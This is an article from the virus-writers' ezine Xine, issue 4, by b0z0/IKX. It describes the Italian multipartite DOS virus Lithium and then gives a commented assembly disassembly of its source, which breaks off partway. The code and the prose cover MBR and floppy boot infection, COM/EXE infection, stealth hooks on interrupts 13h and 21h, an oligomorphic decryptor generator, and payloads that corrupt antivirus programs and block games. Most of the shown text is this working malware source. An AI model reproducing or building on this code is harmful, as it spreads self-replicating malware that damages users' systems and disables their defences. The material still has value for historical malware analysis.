   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #4 - Phile 309 |
   ;                                         \-----------------------------/
   ;
   ;                          Virus Spotlite: Lithium
   ;                               by b0z0/IKX
   ;
   ; Virus name      : Lithium
   ; Virus author    : ATP (?)
   ; Virus origin    : Italy, 1995/96 (?)
   ; Virus lenght    : 4113 bytes
   ; Virus type      : Multipartite BS/MBR/EXE/COM, semipolymorphic, stealth
   ;
   ; Introduction:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  This is a very interesting multipartite semipolimorphic stealth virus from
   ; Italy that has been also found a few times in the wild (at least considering
   ; some older messages in italian virus newsgroups and echo areas). Apart from
   ; including many interesting features, like full stealth on files, formatting
   ; an extra track on floppyes, semipolymorphism and windows compatibility, it
   ; contains some unusual ways to complete some tasks that make the virus worth
   ; examining.
   ;
   ; Memory residency:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  When starting from files to see if the virus is already resident in memory
   ; it will check a word at 0:4eeh (that by default should be zero) that the virus
   ; will also use as a temporary storage for internal installation routines. If
   ; the virus isn't already resident then it will simply try to infect the MBR of
   ; the main disk. The virus will then get resident in memory just at next boot
   ; from the infected MBR (or alternatively when booted from an infected floppy
   ; disk).
   ;  The way the virus uses to get resident is quite strange. In a first moment
   ; it will copy its interrupt 13h handler (at 0:228h) and the virus residency
   ; routine (at 0:282h) to memory and then prepare something like a table with
   ; calls to the residency routine after that. This first interrupt 13h handler
   ; will stealth reads on MBR and will have to check if DOS seems to be loaded.
   ; When DOS will seem to be loaded (a few usual checks are done) it will
   ; point interrupt 21h to the last used element of the table it prepared before
   ; that will, on the very first call to the interrupt 21h, jump to the residency
   ; routine and then execute the requested call. This seems a bit strange, infact
   ; it is. You should check the table I made in the disassembly and read the
   ; comment to get a better idea of how this works.
   ;  The memory residency routine will try to allocate the needed space in memory
   ; triing first to allocate high memory. If this will be succesfull then it will
   ; read the 8 virus sectors (from hd or fd) up there and then jump again to the
   ; beginning of the virus with an internal value in the register BP. When executed
   ; with this internal value the virus will infact delete the CALL to the residency
   ; routine stored before and will also delete the first interrupt 13h handler and
   ; all the rest of the installation code it copied to memory on boot. The virus
   ; will then hook interrupt 21h and will redirect the hook of the interrupt 13h to
   ; the real interrupt 13h routine, this is the one that will have to infect
   ; floppyes (while the one before was just checking for DOS loading).
   ;  The int 87h will be pointed to the original int 21h routine, while the original
   ; int 13h will be redirected to int 86h.
   ;
   ; File infection:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  COM and EXE file will be infected by Lithium on every exec (4bh), open (3dh),
   ; extended open (6ch), chmod (43h) and close (3eh). The virus will check for
   ; suspect filenames, like antiviruses and such, for files that aren't too small
   ; or too big, skip windows executables and such normal procedures. Also the
   ; infection stage is quite normal. For some tasks Lithium uses also SFTs. The
   ; infected file will be first aligned to a lenght that can be divided by 10h and
   ; after that the virus (in poly form) and the original file bytes will be written
   ; to the file.
   ;
   ; File Stealth:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  Lithium does stealth it filesize on findfirst/findnext calls using fcbs
   ; (11h/12h) and using dta (4eh/4fh). To mark infected files it will add 200
   ; years to the infected file date, that will be of course restored when the
   ; virus is active. The date will be also corrected when a get/set file date
   ; function will be issued (57h).
   ;  On file read functions (3fh) the virus will check if the user would like to
   ; read the file header. If so the virus will restore the original header bytes
   ; so the user couldn't notice the virus changes. It is interesting that the virus
   ; will have to read the infected file decryption routine and get the encryption
   ; method from it and in this way it will be able to decrypt and restore the
   ; original header informations, handling the various possible reads (like reading
   ; just a part or the entire header). It will also of course truncate every try
   ; to read after the lenght of the original file, this is to read the virus body.
   ;  Finally also after a succesfull infection on open (3dh) or extended open (6ch)
   ; the virus will stealth its lenght in SFTs.
   ;  This stealth procedures will be disabled when the virus will think that PKZip
   ; or a Backup program are being run.
   ;
   ; Floppy/MBR infection/stealth:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  Floppyes are infected on interrupt 13h functions read and write (02 and 03).
   ; When infecting a floppy the virus will format an extra track in a quite usual
   ; way and store it's encrypted body and original boot sector there. The virus
   ; won't permit anyone to read or write that extra track using int 13h. It is
   ; interesting that the virus keeps two bytes to keep the status of the current
   ; floppyes (A: and B:). One byte is used to mark if the floppy is infected or
   ; not, while the other is used to mark if the floppy has been already checked or
   ; not. This way the virus won't need to check for infection/stealth each time
   ; a function is issued, but it will just check if the floppy disk has changed
   ; (using function 16h of int 13h) and if it hasn't then it will use the internal
   ; variables to understand if it has to check/infect/stealth the floppy or not.
   ; Of course each time a disk change is detected or a format track is executed the
   ; internal variables will be reinitialized so the virus will have to analyze the
   ; floppy in the diskette drive. This is of course an interesting feature, even if
   ; a bit space-consuming, since makes access to floppyes much faster and prevent
   ; that quite boring sound of floppy drive seeking here and there.
   ;  If writes to the floppy boot sector will be requested then the virus will
   ; update the saved original boot sector on the floppy while on each read, when
   ; needed, also the original data will be given instead of the infected boot.
   ;  The MBR infection is done in a quite normal way. First of all the virus will
   ; check if the MBR is already infected (the virus name is placed as marker) and
   ; check if there are some DOS partitions on the hard disk. If there isn't any
   ; then very probably the virus won't have any possibility to get active, so it
   ; won't even infect the MBR. After this checks the virus will disable some BIOS
   ; virus protections, save the original MBR and infect the hd in a quite normal
   ; way. When the user will try to access some sector on the disk where the virus
   ; will store itself (from 0/0/4 for 8 sectors) it will just forget that operation,
   ; while when a read to the MBR will be requested it will stealth giving the
   ; original one.
   ;  Both the virus floppy boot and MBR are composed by a common piece of code that
   ; initializes the stack and such (look at label generic_boot in disasm) and
   ; another part depending if there is a floppy or MBR that will read the virus to
   ; memory and jump there. So at boot this standard boot will be executed, then
   ; the control will be given to the generated poly decryptor that will decrypt the
   ; virus body and just then the real virus code will come in.
   ;
   ; Polymorphism:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  The virus is slightly polymorphic in files as well as when on floppy and in
   ; MBR (after getting control from the standard virus boot). It uses an
   ; oligomorphic routine to generate decryptors that are, by consequence, quite
   ; simple but the design is rather interesting.
   ;  The routine infact has 7 parts of code for the decryptor and this will be
   ; put randomly in the space for the decryptor (72h bytes at the beginning) and
   ; "connected" with jumps from one to another. Each part will be put in one of
   ; the 7 portions long 10h bytes, so they won't overwrite each other or something
   ; like. This parts are quite simple, some have one or more way to be done, but
   ; anyway the possible generations aren't too many and an algorithmic scanning is
   ; quite straightforward (infact also the virus itself will have to somehow
   ; 'emulate' the decryptor to get the key and math operation it used, so it will
   ; be able to restore the original bytes of the file). The parts the decryptor
   ; will create, that will be executed in this exact sequence, are anyway:
   ;   - adjust segment, this is set ds=cs, plus a one byte garbage (this one byte
   ;     garbage is done to make the part 5 bytes long, including the jump)
   ;   - lenght setting, sets in ax the virus lenght
   ;   - pointer setting, sets in pointer register (di/si/bx) initial pointer value
   ;   - not decryption instruction, will generate a NOT on the decryption
   ;     instruction to hide it a bit
   ;   - decryption instruction, this is a xor/sub/add byte ptr [si/di/bx],imm8
   ;   - pointer increment, this is a INC of the pointer register (di/si/bx)
   ;   - counter decrement, simply DEC ax and a JNE to begin of the loop.
   ;  This parts as said will be connected by jumps and finally a jump to the
   ; beginning of the code will be generated. To make the result a bit better also
   ; some random bytes will be put on the 'background' of the generated decryptor.
   ; The first 4 parts will be 5 bytes long (including the short jump to the next
   ; part). This fact will infact be used by the virus itself to go through the
   ; decryptor (by just getting the offsets of the short jumps) and find the
   ; encryption method and encryption key.
   ;  When the virus will generate the decryptor and encrypt the body it will always
   ; just use a 200h buffer and write from time to time the results (to disk sectors
   ; or to file).
   ;
   ; Payloads:
   ; ÄÄÄÄÄÄÄÄÄ
   ;  Lithium has a few payloads depending on the system date and on the function
   ; is being used. If the current day is later than may 1996 then the virus,
   ; depending on a quite random value (the stack value), could activate itself.
   ;  It has tho 6 possible payloads (depending on the stack value):
   ;    - change colors (could activate only on open or delete file instructions)
   ;    - change gray color (only on select default drive)
   ;    - change palette register (only on remove directory)
   ;    - write a command to com1 and com2 (only on write to file)
   ;    - print virus name on printer (only on create temporary file)
   ;    - set volume and serial number of hd to virus one
   ;    - increment the system clock by one minute
   ;  The check for payload activation is done on each int 21h call. Also when a
   ; payload (indifferently which one) is activated the virus won't allow the
   ; games DOOM, Wolfstein 3D and Quake to be played by just setting a CD20h at the
   ; file entry point when someone will try to run them. Nasty :) From june of 1996
   ; also many antiviruses will be corrupted by a CD20h set on their begin so they
   ; won't run anymore.
   ;
   ; Other goodies:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  The virus has its own int 24h error handler and it will add to the WIN
   ; (possibly Windoze) command line parameters /D:FC so it won't scare the user
   ; that something should be wrong with disk access.
   ;  It has an interesting message in it, here is a translation:
   ;   Swimming in the honey
   ;   Blinded by light
   ;         Oppressed by freedom
   ;   Sick of insincere and easy smiles
   ;   We fight to find something to believe in.
   ;   The notes of rage and instability
   ;   are the detonator of the wish to continue...
   ;   ...'CAUSE WE ARE ALIVE!



   .286

   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;ÛÛ                                                  ÛÛ
   ;ÛÛ                             Lithium                                  ÛÛ
   ;ÛÛ                        disasm by b0z0/iKX                            ÛÛ
   ;ÛÛ                                                                      ÛÛ
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

   virus_lenght     = (offset temp_memory - offset start + 0fh)
   virus_enc_lenght = (offset temp_memory - offset real_start)
   virus_paras      = ((offset temp_memend - offset start + 10h) / 10h) + 1h

   seg_a       segment byte public
           assume  cs:seg_a, ds:seg_a

                   org     0

   lithium:

   start:

   oligo_space     db      72h     dup (90h)     ; space for the oligo decryptor

   real_start:
                   mov     ax,es                           ; if ES=0 then virus
                   or      ax,ax                           ; is executed from boot
                   jnz     from_file
                   jmp     from_bootmbr
                   jmp     short from_file
           nop

   virus_name      db      "Lithium"

   from_file:
                   cmp     bp,1515h                        ; virus int. value?
                   jne     normal_file_run
                   jmp     run_from_mem                    ; if so we are being
                                                           ; executed from mem
   normal_file_run:
                   call    delta_offset
   delta_offset:
                   pop     bx
                   sub     bx,offset delta_offset
           mov cl,4
                   shr     bx,cl                           ; manual reloc in mem
           mov ax,cs
           add ax,bx
           push    ax
                   mov     bx,offset reloc_there           ; and jump there
           push    bx
                   retf

   reloc_there:
           push    es
                   xor     cx,cx
           mov ds,cx
                   cmp     word ptr ds:[4eeh],cx           ; residency check
                   jne     back_original

                   pushf
           pop ax
                   and     ax,0fffh
           push    ax
                   popf
                   pushf
           pop ax
                   and     ax,0f000h
                   cmp     ax,0f000h
                   je      back_original

                   mov     al,0cfh                         ; iret opcode
                   les     di,dword ptr ds:[01h * 4]
                   stosb                                   ; put iret at int1h
                   les     di,dword ptr ds:[03h * 4]
                   stosb                                   ; put iret at int3h

                   push    cs
           pop ds
           push    cs
           pop es
                   mov     ah,13h                  ; set int13h handler to some
                   int     2fh                     ; place and get original in
                                                   ; es:bx
                   push    ds
           mov ds,cx
                   mov     word ptr ds:[(86h * 4)],bx      ; int86h will became
                   mov     word ptr ds:[(86h * 4) + 2],es  ; original int13h
           pop ds
                   mov     ah,13h                  ; set int13h to the good one
                   int     2fh                     ; again

           mov dl,80h
                   call    check_nfect             ; check if have to infect mbr
                   jc      back_original
                   call    infect_mbr              ; infect that
   info_lup:
                   jnc     info_lup
   back_original:
                   xor     cx,cx                   ; zero all registers
           mov ax,cx
           mov bx,ax
           mov di,bx
           mov si,di
           pop ds

                   cmp     byte ptr cs:[com_or_exe],1
                   jne     com_restoration

   exe_restoration:
                   mov     ax,ds
           add ax,10h
                   add     word ptr cs:[original_cs],ax    ; host cs reloc
                   add     ax,cs:[original_ss]             ; ss reloc
           mov ss,ax
                   mov     sp,cs:[original_sp]             ; original sp
                   xor     ax,ax
                   jmp     dword ptr cs:[original_ip]      ; go to original EXE

   com_restoration:
                   push    cs
           pop ds
           inc sp
           inc sp
                   cld
                   inc     ah                      ; AX = 100h
                   mov     si,offset original_file
           mov di,ax
                   movsw                           ; restore original 3 bytes
                   movsb
                   xor     di,di
                   xor     si,si
           push    es
           pop ds
                   push    es
                   push    ax                      ; push cs:100h
                   dec     ah                      ; zero ax too
                   retf                            ; go to original com

   com_or_exe      db      00h

                   db      "Nuotando nel miele",0
                   db      "Accecati dalla luce",0
                   db      "Oppressi dalla liberta'",0
                   db      "Nauseati dai falsi e facili sorrisi",0
                   db      "Lottiamo per trovare qualcosa in cui credere.",0
                   db      "Le note della rabbia e dell'instabilita'",0
                   db      "sono il detonatore della voglia di proseguire...",0
                   db      "...'CAUSE WE'RE ALIVE!",0
                   db      "You'llKnowWhatNITROMeans!",0
                   db      "byATP"

   decr_jmps_tbl:
                   dw      00h     ; offset to segment adjustment
                   dw      00h     ; offset to counter assignation
                   dw      00h     ; offset to pointer assignation
                   dw      00h     ; offset to decryptor modification
                   dw      00h     ; offset to decryption instruction
                   dw      00h     ; offset to pointer increment
                   dw      00h     ; offset to counter decrement and check
                   dw      00h     ; offset to the begin of virus body

   decr_block_jmp:
   ;
   ; bx = offset from beginning of block jumping table
   ; si = running offset to substract
   ;
   ; this subroutine creates a jmp short from the current decryptor position
   ; (recognized from SI value) to the selected next decryptor block (value
   ; got from [decr_jmps_tbl + bx]
   ;
           push    ax
           push    bp
           push    di
           mov bp,si
           add si,2
                   mov     di,word ptr [decr_jmps_tbl + bx]  ; get from the tbl
                   mov     ax,di                             ; where we must jump
                   sub     ax,si                   ; calculate jump lenght
                   mov     ah,al
                   mov     al,0ebh                 ; jmp short opcode
                   mov     word ptr ds:[bp],ax     ; store jump to next block
           mov si,di
           pop di
           pop bp
           pop ax
           retn


   oligo_algo:
   ; entry DX = initial pointer value, this is where encrypted stuff begins
                   push    bp
           push    bx
           mov bp,dx
                   call    seg_bx_tspace           ; point after virus body
                   xor     ax,ax
                   int     1ah                     ; get system time count

                   mov     ax,5050h
           xor ax,cx
                   xor     ax,dx                   ; generate the random value
                   and     cl,7                    ; depending on date and
                   ror     ax,cl                   ; time
           push    ax
           mov ah,4
                   int     1ah                     ; get date
                   pop     ax

                   xor     ax,cx
                   xor     ax,dx                   ; AX contains random value
                                                   ; for the entire generation
                   mov     dx,offset temp_memory
                   xor     di,di
   enc_chunk_loop:
                   or      dx,dx                   ; bytes to be encrypted
                   jnz     continue_enc
                   jmp     finished_enc            ; if zero it is finished
   continue_enc:
           mov cx,dx
                   cmp     ch,1                    ; if <= 1xxh then finish it
                   jbe     last_chunk
                   mov     cx,200h                 ; else do a 200h chunk
   last_chunk:
           sub dx,cx
           mov si,bx
                   cld
           push    cx
           push    si
           push    di
           xchg    si,di
                   rep     movsb                   ; copy next 200h chunk
           pop di
           pop si
           pop cx
           push    cx
                   or      di,di                   ; if zero then we are at the
                   jz      must_make_dec           ; first 200h chunk, so we must
                                                   ; create the decryptor
                   jmp     encr_instr              ; else just keep encrypting
                                                   ; 200h virus chunks
   must_make_dec:
                   add     si,72h                  ; where will start later enc
                   sub     cx,72h                  ; decryptor won't be encrypted
           push    dx
           push    cx
           push    di
           push    si
           push    ax

                   push    ds
           mov di,bx
                   xor     si,si
           mov ds,si
                   mov     cx,72h                  ; put some random bytes in the
                   rep     movsb                   ; middle of the decryption
                   pop     ds                      ; blocks

                   mov     dl,6                    ; must stay in the 00h-70h area
                   mov     cl,7                    ; 7 offset for blocks to create
                   mov     di,offset decr_jmps_tbl

   create_offsets:
                   lodsw                                   ; random number
                   and     ax,7
                   inc     al                              ; offset between 02h
                   inc     al                              ; and 09h
                   mov     word ptr es:[di],ax
                   mov     al,10h                          ; each block on a
                   mul     dl                              ; different 10h block
                   dec     dl                              ; so they won't disturb
                   xor     ah,ah                           ; each other
                   add     ax,offset temp_memory + 2       ; + base where code is
                                                           ; generated
                   add     word ptr es:[di],ax             ; add to base before
                   add     di,2                            ; point on next offset
                   loop    create_offsets

           pop ax
                   push    ax                              ; has the rnd value
                   mov     cl,0fh                          ; moving loops through
                                                           ; the offsets table

   move_offsets:
                   ror     ax,1
           mov dx,ax
                   and     dx,7                    ; get one from table to xchange
           cmp dl,6
                   jbe     good_src_xchg
           mov dl,4
   good_src_xchg:
           add bx,si
                   and     bx,7                    ; select the one to exchange
                   cmp     bl,6                    ; with
                   jbe     good_dst_xchg
           mov bl,5
   good_dst_xchg:
                   mov     si,offset decr_jmps_tbl
           mov di,si
                   shl     bx,1                    ; both source and destination
                   shl     dx,1                    ; *2 since offsets are words
           add si,bx
           add di,dx
                   mov     bx,word ptr es:[si]     ; exchange the two blocks
                   xchg    word ptr es:[di],bx     ; offsets
                   mov     word ptr es:[si],bx
                   loop    move_offsets
                   pop     ax


                   mov     bx,offset temp_memory
           mov si,bx
           push    bx
                   xor     bx,bx
                   call    decr_block_jmp          ; first normal jump

                   mov     word ptr [si+1],1f0eh   ; push cs, pop ds opcodes
                   mov     cl,0a7h                 ; cmpsw opcode
                   cmp     al,0aah
                   ja      use_stringsi
                   mov     cl,37h                  ; aaa opcode
   use_stringsi:
                   cmp     ah,0aah
                   ja      no_change1b
                   or      cl,8                    ; convert to scasw/aas
   no_change1b:
                   mov     byte ptr [si],cl        ; put one byte garbage
           inc bx
           inc bx
           add si,3
                   call    decr_block_jmp

                   mov     byte ptr [si],0b8h      ; mov ax,
           inc si
                   mov     cx,(virus_enc_lenght)
                                                   ; encrypted body virus lenght
                   mov     word ptr [si],cx
           inc si
           inc si
           inc bx
           inc bx
                   call    decr_block_jmp

                   mov     dx,0430h                ; xor byte ptr [si],al
                   mov     cx,3480h                ; xor byte ptr [si],imm8
                                                   ; in CX will be carried the
                                                   ; enc instruction while in DX
                                                   ; the decryption one
                   cmp     al,0aah
                   jae     good_encr
                   xor     dl,dl                   ; to add
                   mov     ch,2ch                  ; so enc to sub
                   cmp     al,55h
                   jae     good_encr
                   mov     dl,28h                  ; to sub
                   mov     ch,4                    ; so enc to add
   good_encr:
                   cmp     ah,55h
                   jbe     good_pointer
                   or      ch,1                    ; or 1 means use DI as pointer
                   cmp     ah,0aah
                   jae     good_pointer
                   or      ch,2                    ; or 3 becames use BX as pntr
   good_pointer:
           push    cx
                   mov     word ptr ds:[encr_instr],dx
                   jmp     short prefeccia
   prefeccia:
           and ch,3
           mov dh,ch
                   shl     ch,1
           and ch,4
           and dh,1
                   or      ch,dh                   ; convert from pointer value
                   or      ch,2                    ; to value for immediate
                   xor     ch,4                    ; assignment (SI 1 -> 6,
                   pop     di                      ; DI 2 -> 7, BX 3 -> 3)
           push    cx
                   or      ch,0b8h                 ; mov reg_pointer,imm16
                   mov     byte ptr [si],ch
           inc si
                   mov     word ptr [si],bp        ; initial pointer value
           inc bx
           inc bx
           inc si
           inc si
                   call    decr_block_jmp

                   mov     cx,di
                   and     ch,3                    ; get pointer register
           cmp ch,2
                   jne     goo_pntt
           inc ch
   goo_pntt:
                   or      ch,54h                  ; not opcode with reg used
                   mov     cl,0f7h                 ; not prefix
                   mov     word ptr [si],cx        ; store the not
                   mov     cx,word ptr [decr_jmps_tbl + 08h]
                   sub     cx,word ptr [decr_jmps_tbl + 0eh]
                   mov     byte ptr [si+2],cl      ; store the offset from NOT
                   add     si,3                    ; instruction to the decryption
                   inc     bx                      ; instruction for the change
           inc bx
                   call    decr_block_jmp

                   not     di      ; decryption instruction isn't clear but NOTed
                   mov     word ptr [si],di        ; store decryption instruction
                   mov     byte ptr [si+2],al      ; and value
           add si,3
           inc bx
           inc bx
                   call    decr_block_jmp

                   pop     cx
                   or      ch,40h                  ; increment pointer
                   mov     byte ptr [si],ch
           inc si
           inc bx
           inc bx
                   call    decr_block_jmp

                   mov     byte ptr [si],48h       ; decrement counter AX
           add si,3
                   mov     cx,word ptr [decr_jmps_tbl + 08h]
                   sub     cx,si                   ; calculate jump to next loop
           mov ch,cl
                   mov     cl,75h                  ; jne next loop
                   mov     [si-2],cx               ; store
           inc bx
           inc bx
                   call    decr_block_jmp          ; else last jump to virus entry

           pop bx
           pop si
           pop di
           pop cx
           pop dx

   encr_instr:
                   dw      0430h                   ; will be substituted by the enc
                   inc     si                      ; instruction using [si] and al
                                                   ; as key
                   loop    encr_instr              ; encrypt chunk

           pop cx
                   add     di,cx                   ; move on next chunk
           push    ax
           push    bx
           push    cx
           push    dx
                   call    word ptr cs:[what_call] ; call the routine that will
                   pop     dx                      ; write the chunk to file or
                   pop     cx                      ; boot which address is in
                   pop     bx                      ; [what_call]
           pop ax
                   jmp     enc_chunk_loop
   finished_enc:
           pop bx
           pop bp
           retn

   write_to_disk:
   ; this routine writes the 200h chunk (or smaller if last) to disk. values of
   ; where to place the virus (h/s/c) are setup before in virus code. the chunk
   ; is already pointed by ES:BX
                   inc     word ptr ds:[value_cx]
                   jmp     short prefetchio
   prefetchio:
           mov ax,301h
                   db      0b9h                    ; mov cx,
   value_cx        dw      05h
                   db      0bah                    ; mov dx,
   value_dx        dw      80h
                   int     86h
           retn

   write_to_file:
   ; this routine writes the 200h chunk to a file. the virus body in input is at
   ; ES:BX. if the last chunk is written to file then also the bytes of align to
   ; a 10h boundary lenght are written
                   mov     ah,40h                  ; write to file
           mov dx,bx
                   db      0bbh                    ; mov bx,
   file_handle     dw      05h
                   int     87h
           cmp cx,200h
                   je      not_last_cnk

                   mov     ah,40h                  ; write
                   mov     cx,0fh
                   mov     dx,0aaaah
                   db      80h,0e9h                ; sub cl,
   value_cl        db      0ch                     ; align to 10h
                   int     87h
   not_last_cnk:
           retn

   from_bootmbr:
   ; entry point when virus is activated from mbr or floppy bs. control is
   ; given here after the stable virus loader and the oligo decryptor

                   cld
                   push    00h
                   pop     es
                   push    00h
                   pop     ds
                   mov     ax,201h                 ; read orignal mbr of fb
                   mov     bx,7c00h                ; to 0:7c00h
                   pop     dx                              ; on the stack are
                   mov     word ptr cs:[read_from_dx],dx   ; present the params
                   pop     cx                              ; of hd or fb where
                   mov     word ptr cs:[read_from_cx],cx   ; the virus resides
                   dec     cx                      ; virus resides - 1 = original
                   int     13h                     ; mbr of fbs

                   mov     word ptr ds:[4eeh],02eeh        ; virus internal value
                   mov     si,13h * 4
                   mov     di,86h * 4
                   push    si
                   movsw                           ; save original int13h at
                   movsw                           ; the int86h position

   ; map of virus in memory installation:
   ;
   ;  0:228h - 0:2D9h      : virus int13h handler code
   ;  0:282h               : virus loading in memory routine, this is the
   ;                       ; memory_residence routine
   ;  0:2F6h               : CALL to 0:282h + first JMP FAR opcode
   ;  0:2FAh               : original int21h segment:offset
   ;  0:2FEh               ; CALL to 0:282h + first JMP FAR opcode
   ;  0:306h               : CALL to 0:282h + first JMP FAR opcode
   ;  0:30eh               : CALL to 0:282h + first JMP FAR opcode
   ;  0:316h               : CALL to 0:282h + first JMP FAR opcode
   ;  0:4eeh               ; word used by virus for residency check and internal
   ;                       ; purposes
   ;  0:4f0h - 4f8h        : a JMP to 0:228, int 86h and retf2
   ;                       ; the int 86h will be changed to a int 88h

                   push    cs
                   pop     ds
                   mov     si,offset handler_13h           ; copy to 0:228h the
                   mov     di,228h                         ; first int13h handler
                   mov     cx,(offset handler_13h_end - offset handler_13h)
                   rep     movsb

                   mov     cl,05h                  ; put the calls as described
                   mov     di,2f6h
                   mov     bx,(282h - (2f6h + 03h))        ; call offset
   put_calls_t:
                   mov     al,0e8h                 ; call opcode
                   stosb
           mov ax,bx
                   stosw
                   sub     bx,8                    ; call offset
                   mov     al,0eah                 ; jmp far opcode
                   stosb
                   add     di,4                    ; on next one
                   loop    put_calls_t


                   mov     si,offset int_jumper
                   mov     di,4f0h
                   mov     cl,(offset int_jumper_end - offset int_jumper)
                   push    di                      ; copy the other bounch of
                   rep     movsb                   ; code
           pop ax
                   pop     di                      ; DI = to 13h in IVT

                   stosw                           ; store offset to the stored
                   xor     ax,ax                   ; jump at 0:4f0h as new int13h
                   stosw                           ; store our segment

                   mov     dl,80h
                   call    check_nfect             ; check to infect mbr
                   jc      already_orbad
                   call    infect_mbr
   already_orbad:
                   db      0eah                    ; jmp far to original mbr
                   dw      7C00h, 0                ; or floppy boot

   int_jumper:
                   db      0e8h
                   dw      (228h-4f3h)
                   int     86h                     ; original int13h
                   retf    2                       ; back to reality
   int_jumper_end:

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   handler_13h:
   ; this is the virus int13h handler that is installed as soon as the virus gets
   ; resident from mbr or fbs
                   call    reading_mbr             ; check if reading mbr

                   pusha
                   push    ds
                   xor     ax,ax
                   mov     ds,ax                   ; on ivt
                   mov     si,21h * 4              ; on int21h entry

                   or      ax,word ptr ds:[si+2]           ; int21h handler seg
                   je      via_da_qui                      ; check if dos
                   cmp     ax,800h                         ; seems loaded
                   jnb     via_da_qui
                   cmp     word ptr ds:[(27h * 4) + 2],ax
                   jne     via_da_qui

                   cld                                     ; so hook int21h
                   mov     bx,word ptr ds:[si]             ; bx int21h handler off
                   mov     di,word ptr ds:[4eeh]           ; di points on last
                   mov     byte ptr ds:[di],0e9h           ; used call + jmp block
                   mov     word ptr ds:[di+1],ds           ; jmp $+3
                   add     di,08h                          ; di + 8 points on
                                                           ; the next call+jmp
                                                           ; (look mem map up)
                   mov     word ptr ds:[4eeh],di           ; store offset to the
                                                           ; actually used one
                   mov     word ptr ds:[di+4],bx           ; segment and offset for
                   mov     word ptr ds:[di+6],ax           ; the jmp far

                   mov     word ptr ds:[(87h * 4)],bx      ; int87h is the
                   mov     word ptr ds:[(87h * 4) + 2],ax  ; original int21h

                   mov     word ptr ds:[si],di             ; int21h points now
                   mov     word ptr ds:[si+2],ds           ; to last virus handler
   via_da_qui:
                   pop     ds
                   popa
                   ret

   reading_mbr:
                   cmp     ah,2                    ; read function
                   jne     no_mbrstealth
           cmp cx,1
                   jne     no_mbrstealth
                   cmp     dx,80h                  ; reading mbr
                   jne     no_mbrstealth
                   inc     cl                      ; stealth to original mbr
           inc cl
   no_mbrstealth:
           retn

   memory_residence:
                   pushf
                   pusha
                   push    ds
                   push    es
                   mov     ax,5800h                ; get memory alloc startegy
                   int     87h
                   push    ax
                   mov     ax,5802h                ; get umb link state
                   int     87h
                   push    ax
                   mov     al,01h                  ; set memory alloc strategy
                   mov     bx,80h                  ; to first fit, try high first
                   int     87h
                   mov     al,03h                  ; set umb link state
                   mov     bl,01h                  ; add umb to dos chain
                   int     87h
                   mov     ah,48h                  ; allocate needed memory
                   mov     bx,virus_paras
                   int     87h
                   jb      came_here               ; exit on error

                   push    ax
                   dec     ax
                   mov     ds,ax                   ; on virus mem block mcb
                   mov     word ptr ds:[01h],8h    ; set as dos owned
                   mov     ax,208h                 ; read eight virus sectors
                   xor     bx,bx
                   pop     es                      ; to allocated memory
                   db      0b9h                    ; mov cx,
   read_from_cx    dw      5102h                   ; where from hd or fd
                   db      0bah                    ; mov dx,
   read_from_dx    dw      0h                      ; where from dx
                   int     86h
                   mov     bp,1515h                ; internal virus value
                   push    es                      ; jump again to beginning
                   push    bx                      ; of the virus
                   retf
   came_here:
                   mov     ax,5803h                ; set umb link state
                   pop     bx
                   xor     bh,bh                   ; restore the old one
                   int     87h
                   mov     ax,5801h                ; set mem alloc strategy
                   pop     bx                      ; restore the old one
                   int     87h
                   pop     es
                   pop     ds                      ; exiting mem loading routines
                   popa
                   popf
                   ret
   handler_13h_end:
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   run_from_mem:
                   push    cs
                   pop     ds
                   push    00h
                   pop     es
                   mov     al,90h                          ; nop opcode
                   mov     di,word ptr es:[04eeh]          ; pointer on actual
                   mov     word ptr ds:[jmp_far_off],di    ; res+21h block
                   cld
                   stosb                   ; delete the call to the residency
                   stosb                   ; routine with NOPs
                   stosb
                   push    es
                   pop     ds
                   inc     di              ; DI now points on the original seg:off
                   push    di              ; of the int21h, stored before after the
                   mov     si,di           ; JMP FAR and make SI point the same
                   mov     di,4f0h         ; point DI where the Int13h handler
                   stosb                   ; resides and cover the CALL to 228h
                   stosb                   ; (this is the int21h checker) with
                   stosb                   ; nops
                   push    cs
                   pop     es
                   mov     di,offset old_int21h
                   movsw                   ; SI points on adress of original int21h
                   movsw                   ; and put that in dword old_int21h
                   pop     di              ; pop pointer to int21h seg:off
                   push    ds
                   pop     es
                   mov     ax,offset int21h_handler
                   stosw                   ; now put the virus handler instead
                   mov     ax,cs           ; of it, this is hook int 21h
                   stosw

                   xor     ax,ax
                   mov     di,228h                 ; delete the first int13h
                   mov     cx,0b1h                 ; handler with mem res stuff
                   rep     stosb                   ; from memory

                   mov     byte ptr cs:[payload_byte],al
                   mov     word ptr cs:[value_ax1],ax      ; virus values
                   mov     word ptr cs:[value_ax2],ax      ; initialization

                   mov     word ptr ds:[88h * 04h],offset entry_88h ; hook int88h
